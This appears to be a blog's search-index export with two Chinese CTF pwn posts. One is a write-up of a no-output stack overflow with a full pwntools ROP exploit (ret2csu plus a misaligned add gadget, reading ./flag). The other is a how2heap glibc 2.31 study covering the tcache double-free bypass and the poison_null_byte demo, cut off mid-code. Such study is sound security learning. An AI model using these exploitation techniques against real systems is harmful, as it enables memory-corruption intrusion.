<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>mini-L 2023 复现</title>
    <link href="/2023/11/08/miniL/"/>
    <url>/2023/11/08/miniL/</url>
    
    <content type="html"><![CDATA[<p>给上半年填个坑.</p><span id="more"></span><h2 id="0x00">0x00</h2><p>11.4打了一个叫鹏城杯的比赛, 里面有一道题是无输出函数的栈溢出, 经过高人指点发现是和miniL-twins一样的东西, 这才想起来 当时根本就没有复现到这里, 忘记是彻底不会做还是被诸如期末考试什么的东西折磨了, 然后来来回回, 卡在这了, 又拖拖拖, 就到了现在了.</p><blockquote><p>本来想说点什么东西, 但是又觉得没什么好说的, 就这样吧</p></blockquote><h2 id="0x01-twins">0x01 twins</h2><p><img src="image-20231106195318501.png" alt="image-20231106195318501"></p><p>本身是一个骑脸的栈溢出, 在minil中这个题用了个脚本, 起了2个程序, 检测输出是否一样.</p><blockquote><p>pc杯是直接把所有输出函数直接去掉, 只有一次输入的机会, 还加了个orw.</p><p><s>当时做miniL的时候还在想什么办法绕, 这次直接开始找什么特殊的leak手段, 根本就没想到miniL还有这</s></p></blockquote><p>无输出, 意味着我们没有泄露的机会, 只能<strong>以一种间接的方式去硬跑libc里面的函数</strong>:</p><ul><li>内存中是有libc地址的, 举个最简单的例子就是<strong>bss段上的stdout</strong>等, <strong>且bss段可读可写</strong></li><li>在程序不开pie的时候, <strong>bss里的这段libc地址我们是已知的, 同时也可以得知与其他函数的偏移</strong></li><li>在 “<strong>ret2csu</strong>” 这种手法中, 我们可以做到用2段gadget布置参数且直接使用call调用, 非常强大</li></ul><p>那如果我们找到一些手段, 可以<strong>通过已知的偏移来对内存中的地址加以计算&amp;调用</strong>, 那便省去了leak这一步骤</p><hr><p>但是在这两道题当中, 采用一些标准化的手段并不能找到这么一种方式, 内存当中的gadget很规整, 几乎不会有这种机会, 这时候利用一些工具可以找到这样的一个gadget:</p><p><code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code></p><p><img src="image-20231108023657813.png" alt="image-20231108023657813"></p><p>这个地方如果去打开ida的汇编查看的话, 是一句很明朗的语句:</p><p><img src="image-20231108023830313.png" alt="image-20231108023830313"></p><p>但是在上图ROPgadget的查找中, 我们使用grep/rg去查找的话, 便可以突破固有的指令, 实现<strong>错位</strong>.</p><blockquote><p>这个地方后续查了查别的wp, 很多人把这个东西叫做 “magic_gadget”, 我觉得还挺贴切的</p><p>并且看上去这种gadget的功能也比较强大, 我反正觉得肯定不只这一个能派上点用场, 又学废了</p></blockquote><p>在我们足以控制ebx和rbp的时候, 这个gadget的功能就似乎非常强大, 因为在ret2csu中就直接存在<code>pop rbx; pop rbp</code>, 普遍的偏移应该少有超过四个字节的, 所以在这里对libc而言效果甚至等同于一个任意地址写.</p><hr><p>twins这道题当中利用比较简洁, 只需要用两次add写入一个<code>/bin/sh</code>, 再add出一个偏移调用system, 中间控制一下参数即可, 同时这道题还是使用gets函数, 不限制输入长度, 一次性写好通了即可.</p><p>但是在pc杯这个题中, 第一次控制了输入长度0x100字节, 还要orw, 难度稍微要高出一些:</p><ul><li>第一次输入之后要迁移, 构造出一个很大的bss段输入.</li><li>第二次输入可以直接构造三段csu调用进行orw, 只是要多次进行控制参数, 看起来繁琐, 但实质是重复操作.</li></ul><p>放一个pc杯的题和exp, minil这个属于第一层, pc杯相对来讲是第二层, 思路一致, 很有说法.</p><p>链接：<a href="https://pan.baidu.com/s/1K3731YqV5HagDgVE40eyzA">https://pan.baidu.com/s/1K3731YqV5HagDgVE40eyzA</a><br>提取码：aqot</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./silent&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,27946)</span><br>elf=ELF(<span class="hljs-string">&quot;./silent&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>csu_rbx_rbp_r12_r13_r14_r15=<span class="hljs-number">0x40095a</span><br>add_ebx_gadget=<span class="hljs-number">0x4007e8</span><br>csu_start=<span class="hljs-number">0x400936</span><br>stdout_offset=<span class="hljs-number">0x3ec760</span><br>offset_open=<span class="hljs-number">0x10fbf0</span>-stdout_offset<br>offset_read=<span class="hljs-number">0x110020</span>-<span class="hljs-number">0x10fbf0</span><br>offset_write=<span class="hljs-number">0x1100f0</span>-<span class="hljs-number">0x110020</span><br>mainaddr=<span class="hljs-number">0x400878</span><br>read_got=elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br>leave_ret=<span class="hljs-number">0x4008fc</span><br><br>stdout=<span class="hljs-number">0x601020</span><br>bss=<span class="hljs-number">0x601800</span><br><br>padding=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span><br><br>payload1=padding+flat([<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">0</span>, bss, <span class="hljs-number">0x600</span>,<br>    csu_start, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    leave_ret<br>])<br><span class="hljs-comment">#debug()</span><br>r.sendline(payload1)<br><br>payload2=<span class="hljs-string">b&quot;./flag\x00\x00&quot;</span><br>payload2+=flat([<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    offset_open, stdout+<span class="hljs-number">0x3d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    add_ebx_gadget,<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, stdout, bss, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu_start, <span class="hljs-number">0</span>, <br>    offset_read, stdout+<span class="hljs-number">0x3d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    add_ebx_gadget, <br>    csu_rbx_rbp_r12_r13_r14_r15,    <br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, stdout, <span class="hljs-number">3</span>, bss-<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>,<br>    csu_start, <span class="hljs-number">0</span>,<br>    offset_write, stdout+<span class="hljs-number">0x3d</span>, stdout, <span class="hljs-number">1</span>, bss-<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>,<br>    add_ebx_gadget,<br>    csu_rbx_rbp_r12_r13_r14_r15,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, stdout, <span class="hljs-number">1</span>, bss-<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>,<br>    csu_start, <span class="hljs-number">0</span>,<br>])<br>debug()<br>r.sendline(payload2)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>这里说点题外话:</p><p>首先是<s>废话 刚需libc算偏移 pc杯是2.27的libc, 小版本1.5</s></p><p>再其次是, 如果这个题不开got表保护, 实际上应该是可以通过ret2dlresolve做的, (<s>minil有非预期, 但是pc杯就似乎很幽默的开了一个Full RELRO, 只能采用相对偏移去做,</s> 👴的评价是 彳亍8️⃣</p></blockquote><h2 id="0x0-Others">0x0? Others</h2><p>之前断断续续的复现过了一两道, 剩下大概三道, twins刚刚调完, 剩下两个似乎短时间还跟我无关,</p><p>但是慢慢学, 慢慢复现, 慢慢写, 估计也应该花不上特别多的时间吧, 希望不要🕊了.</p><blockquote><p>不知道等到把这几个题的手法都拿下的时候 会不会真的有一种放松感呢 ~</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>How2HE4p!</title>
    <link href="/2023/10/31/How2HEAP/"/>
    <url>/2023/10/31/How2HEAP/</url>
    
    <content type="html"><![CDATA[<p>how2heap奥, 看👴干不干你就完🌶️:</p><span id="more"></span><h2 id="0x00">0x00</h2><p>newstar今年week4非常的离奇, 除了一道2.23的doublefree, 那玩意给个勾来都秒了, 剩下全是2.31.</p><blockquote><p>后话是其中一道2.31居然是逆向题, 跟堆毫无关系</p></blockquote><p>踏马的, 看了看我贫瘠的堆题水平, 我发现我几乎就没怎么做过高版本的题, 2.31的水平仅限于最初级的tcache poisoning这种, 痛定思痛, 准备推一下how2heap.</p><p>这篇文章的进度预计是直接从2.31开推, 跟着源码一起看.</p><blockquote><p>以下是本文所用的资源:</p><p>how2heap:<a href="https://github.com/shellphish/how2heap">how2heap</a></p><p>roderick大神的博客:<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.cn)</a></p><p>源码网站: <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2913">malloc.c - malloc/malloc.c - Glibc source code (glibc-2.31) - Bootlin</a></p><p>知乎上的一个专门的2.31的文章:<a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31(zhihu.com)</a>,how2heap仓库下面有一个专门的2.31其实似乎就是这篇文章</p></blockquote><h2 id="0x01-2️⃣-3️⃣1️⃣">0x01 2️⃣.3️⃣1️⃣</h2><p>我们首先从tcache本身的一些东西入手:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>2.31中, 我们可以看到原有的<code>tcache_entry</code>结构相较于2.27加了一层保护, 这层保护应用于2.29及以后的版本, 使用了一个key段, 该段位于chunk的bk段,</p><p>然后<code>tcache_put</code>函数中对key段做了一些手脚, 设置其值为tcache结构体的地址:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>如注释所说, 这一句话的作用是设置标志位, 将其置于tcache中, 防止double free.</p><p>这个保护在free处是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>我们可以看见, free时当key段是tcache时并不是直接挂掉, 而是通过tmp指针在entry链上逐个检查, 如果tmp指针与e(即chunk)的指针值相等,则认为是double free. 之前的tcache double free相当随意, 但是这个检查的绕过似乎也相当随意, 由于在检查时首先看的是key段, 所以只需要改掉key段即可.</p><p>这属于是最基础层面上的一些东西, 接下来看看how2heap里面的:</p><h3 id="1-1-poison-null-byte">1.1 poison_null_byte</h3><p>源码我还是整段的放一下吧:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to poison null byte!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);<br><br><span class="hljs-comment">// step1: allocate padding</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);<br><span class="hljs-type">void</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><span class="hljs-type">void</span> *heap_base = (<span class="hljs-type">void</span> *)((<span class="hljs-type">long</span>)tmp &amp; (~<span class="hljs-number">0xfff</span>)); <span class="hljs-comment">//页对齐</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, heap_base);<br><span class="hljs-type">size_t</span> size = <span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - <span class="hljs-number">0x20</span>; <span class="hljs-comment">//构造个能对到0000的size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);<br><span class="hljs-type">void</span> *padding= <span class="hljs-built_in">malloc</span>(size);<br><br><span class="hljs-comment">// step2: allocate prev chunk and victim chunk</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);<br><span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-type">void</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);<br><br><span class="hljs-comment">// step3: link prev into largebin</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep3: Link prev into largebin&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);<br><span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);<br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nCurrent Heap Layout\n&quot;</span><br> <span class="hljs-string">&quot;    ... ...\n&quot;</span><br> <span class="hljs-string">&quot;padding\n&quot;</span><br> <span class="hljs-string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span><br>      <span class="hljs-string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span><br> <span class="hljs-string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span><br> <span class="hljs-string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now free a, b, prev&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(prev);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)prev)[<span class="hljs-number">2</span>]+<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)prev)[<span class="hljs-number">3</span>]+<span class="hljs-number">0x10</span>);<br><br><span class="hljs-comment">// step4: allocate prev again to construct fake chunk</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);<br><span class="hljs-type">void</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);<br>assert(prev == prev2);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);<br>((<span class="hljs-type">long</span> *)prev)[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);<br>*(<span class="hljs-type">long</span> *)(prev + <span class="hljs-number">0x500</span>) = <span class="hljs-number">0x500</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);<br><br><span class="hljs-comment">// step5: bypass unlinking</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);<br><span 